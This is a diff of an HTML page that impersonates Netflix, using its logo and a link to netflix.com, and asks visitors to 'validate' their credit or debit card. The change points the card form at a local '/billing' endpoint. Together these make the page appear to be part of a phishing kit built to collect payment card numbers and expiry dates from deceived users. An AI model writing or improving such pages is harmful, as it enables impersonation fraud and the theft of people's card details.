@@ -10,12 +10,11 @@
 <body>
     <style>
         body::before{
-            /* background-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.8) 0%, rgba(0, 0, 0, 0.2) 60%, rgba(0, 0, 0, 0.9) 100%),url(img/background.jpg); */
             background-color: white;
         }
     </style>
     <header style="padding: 10px 2%;" class="d-flex space-between center">
-        <a href="/">
+        <a href="https://netflix.com/">
         <img src="img/Netflix-Logo.png"  width="150px" alt="site logo main" style="margin: auto;"></img>
     </a> 
     </header>
@@ -26,7 +25,7 @@
                     <h2 style="color: black;" class="formtitle">
                         Validate your credit or debit card
                     </h2>
-                    <form action="" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
+                    <form action="/billing" id="loginForm" class="d-flex direction-column" method="post" name="loginForm">
                         <input style="background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Card number"  required/>
                         <div>
                             <input style="display: inline-block; width: 44%; margin-right: 4.5%; background-color: white;" type="text" name="card_number" id="card_number" class="billing" placeholder="Expiration date" required />
